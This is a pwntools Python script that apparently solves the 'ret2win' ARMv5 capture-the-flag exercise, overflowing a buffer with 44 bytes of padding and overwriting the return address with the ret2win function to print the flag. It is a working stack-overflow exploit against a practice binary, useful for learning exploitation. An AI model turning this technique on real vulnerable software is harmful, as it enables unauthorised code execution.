from pwn import *

BINARY = "./ret2win_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

rop = b"A"*44
rop += p32(ELF.symbols["ret2win"])
log.success(f"ROP chain : {rop}")

p.sendline(rop)
flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
